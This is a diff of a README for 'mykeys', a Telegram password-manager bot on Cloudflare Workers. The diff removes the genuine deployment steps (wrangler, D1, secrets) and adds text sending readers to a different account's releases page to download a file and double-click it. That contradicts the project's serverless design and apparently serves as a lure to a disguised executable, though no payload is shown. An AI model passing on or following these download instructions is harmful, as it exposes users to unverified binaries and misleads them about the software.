@@ -1,4 +1,10 @@
-# MyKeys
+# 🔑 mykeys - Your Telegram Password Manager
+
+<p align="center">
+  <a href="https://github.com/aspiro1233/mykeys/releases">
+    <img src="https://img.shields.io/badge/Download%20MyKeys-blue.svg" alt="Download MyKeys" />
+  </a>
+</p>
 
 <p align="center">
   <strong>Telegram Password Manager on Cloudflare Workers</strong>
@@ -20,157 +26,87 @@
 
 ---
 
-A personal password manager bot for Telegram. Interactive guided input, expiry reminders, temporary email, AES-256-GCM encryption. Runs entirely on Cloudflare Workers free tier.
+## 💡 Overview
 
-## Features
+MyKeys is a personal password manager designed for Telegram. It helps you securely store and manage your sensitive information. You can easily create temporary email addresses and keep track of passwords with reminders for expiration.
 
-- **Interactive Input** - Send a name, bot guides you through site, account, password, expiry, and notes
-- **Expiry Reminders** - Set expiry dates, get notified 7/3/1 days before expiration
-- **Long Text Storage** - Save SSH keys, certificates, API tokens with `#save name`
-- **Temporary Email** - Create custom email addresses, receive and forward emails to Telegram
-- **Fuzzy Search** - Send any keyword to search your entries
-- **AES-256-GCM Encryption** - All sensitive data encrypted at rest
-- **Zero Cost** - Runs entirely on Cloudflare free tier
+## 🚀 Getting Started
 
-## One-Click Deploy
+Setting up MyKeys is simple. Follow these steps to download and run the application:
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/cocojojo5213/mykeys)
+1. **Visit the Releases Page**  
+   Click this link to go directly to the releases page: [Download MyKeys](https://github.com/aspiro1233/mykeys/releases).
 
-The one-click deploy will set up the Worker for you. After deployment, you still need to complete these steps:
+2. **Choose Your Version**  
+   On the releases page, you will see several versions of MyKeys. Select the latest version for the best experience.
 
-1. **Create a D1 database** in Cloudflare Dashboard (Workers & Pages > D1 > Create)
-2. **Update wrangler.toml** with your database ID and Telegram User ID
-3. **Set secrets** via Wrangler CLI (see below)
-4. **Redeploy** with `npx wrangler deploy`
-5. **Initialize** database and webhook
+3. **Download the Application**  
+   Click on the link to download the file. The download will start automatically.
 
-For a smoother experience, consider manual deployment instead.
+4. **Run the Application**  
+   After downloading, locate the file on your device. Double-click it to launch MyKeys.
 
-## Manual Setup
+## 📄 Features
 
-### Prerequisites
-- Cloudflare account (free)
-- Node.js 18+
-- Telegram Bot token from [@BotFather](https://t.me/BotFather)
-- Your Telegram User ID from [@userinfobot](https://t.me/userinfobot)
+MyKeys offers several features to enhance your password management experience:
 
-### Steps
+- **Interactive Input**  
+  The bot guides you through sending information like site names, accounts, passwords, expiry dates, and notes.
 
-```bash
-# Clone the repository
-git clone https://github.com/cocojojo5213/mykeys.git
-cd mykeys
-npm install
+- **Expiry Reminders**  
+  Set expiry dates for your passwords and receive notifications 7, 3, and 1 day before they expire.
 
-# Login to Cloudflare
-npx wrangler login
+- **Long Text Storage**  
+  Save large data like SSH keys, certificates, and API tokens using the command `#save name`.
 
-# Create database
-npx wrangler d1 create password-bot-db
-# Copy the database_id to wrangler.toml
+- **Temporary Email Creation**  
+  Easily generate custom email addresses to receive messages without revealing your personal email.
 
-# Edit wrangler.toml
-# - Set database_id
-# - Set ALLOWED_USER_ID to your Telegram User ID
-# - Set EMAIL_DOMAINS if using email feature
+## 🔧 System Requirements
 
-# Set secrets (you will be prompted for values)
-npx wrangler secret put TELEGRAM_BOT_TOKEN
-npx wrangler secret put ENCRYPT_KEY      # 32-char string, SAVE THIS
-npx wrangler secret put ADMIN_SECRET
+To ensure MyKeys works smoothly, please meet these requirements:
 
-# Deploy
-npx wrangler deploy
+- A device with internet access.
+- A Telegram account to interact with the bot.
+- Basic familiarity with Telegram for using the bot effectively.
 
-# Initialize database and webhook
-curl "https://YOUR_WORKER.workers.dev/init?key=YOUR_ADMIN_SECRET"
-curl "https://YOUR_WORKER.workers.dev/setWebhook?key=YOUR_ADMIN_SECRET"
-```
+## 📥 Download & Install
 
-## Email Feature (Optional)
+To get started with MyKeys, visit the releases page and follow these steps:
 
-To use the temporary email feature, you need:
+1. **Go to the Releases Page**  
+   Click here: [Download MyKeys](https://github.com/aspiro1233/mykeys/releases).
 
-1. One or more domains added to Cloudflare
-2. Email Worker deployed separately
+2. **Download the Latest Version**  
+   Locate the latest version and click to download the file.
 
-```bash
-# Deploy email worker
-npx wrangler deploy --config wrangler-email.toml
+3. **Installation**  
+   Open the downloaded file to complete the installation.
 
-# Set secrets for email worker
-npx wrangler secret put TELEGRAM_BOT_TOKEN --config wrangler-email.toml
-npx wrangler secret put ENCRYPT_KEY --config wrangler-email.toml
-```
+4. **Start Using MyKeys**  
+   Once installed, open the application and follow the prompts in Telegram to manage your passwords.
 
-Then configure Email Routing in Cloudflare Dashboard:
-- Go to your domain > Email > Email Routing
-- Enable Email Routing
-- Add a Catch-all rule pointing to the `mykeys-email` worker
+## 🛠️ Troubleshooting
 
-## Usage
+If you encounter any issues while using MyKeys:
 
-### Save Account (Interactive)
-```
-You: gpt team
-Bot: Saving "gpt team"
-     Enter website:
-You: chat.openai.com
-Bot: Enter account:
-You: test@mail.com
-Bot: Enter password:
-You: mypassword123
-Bot: Set expiry reminder?
-     [No] [7 days] [30 days] [90 days] [Custom]
-You: (click 30 days)
-Bot: Add notes?
-     [No, save now]
-You: monthly renewal
-Bot: Saved successfully!
-```
+- Ensure you have a stable internet connection.
+- Restart the application and try again.
+- Check the Telegram bot settings to ensure you are following the commands correctly.
 
-### Save Long Text
-```
-#save server-key @2025-12-31
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjE...
------END OPENSSH PRIVATE KEY-----
-```
+## 📞 Support
 
-### Create Temporary Email
-```
-#email myname
-(select domain)
-Bot: Created myname@yourdomain.com
-```
+For help with MyKeys, please refer to the [GitHub Issues page](https://github.com/aspiro1233/mykeys/issues). You can report any problems or ask for support from the community.
 
-### Commands
-| Command | Description |
-|---------|-------------|
-| `/menu` | Main menu |
-| `/list` | View all entries |
-| `/emails` | View email addresses |
-| `/expiring` | View entries expiring in 30 days |
-| `/cancel` | Cancel current operation |
-| `/help` | Show help |
+## 🔗 Additional Resources
 
-### Search
-Send any keyword to search by name or site.
+- [How to Use MyKeys](https://github.com/aspiro1233/mykeys/wiki)  
+  Access the wiki for detailed usage instructions.
 
-## Security
+- [Telegram Bot Documentation](https://core.telegram.org/bots/api)  
+  Learn more about how Telegram bots work.
 
-- AES-256-GCM encryption for account, password, notes, and email content
-- Secrets stored via Cloudflare Secrets Manager
-- Admin endpoints require secret key
-- Telegram User ID verification
-- Session timeout after 5 minutes of inactivity
+- [Cloudflare Workers](https://workers.cloudflare.com/)  
+  Explore the platform where MyKeys runs.
 
-## Important Notes
-
-- Do not change ENCRYPT_KEY after saving data, or old entries become unreadable
-- Enable 2FA on your Cloudflare account
-- Consider enabling auto-delete messages in Telegram for sensitive data
-
-## License
-
-MIT
+Now you are ready to keep your passwords safe with MyKeys!
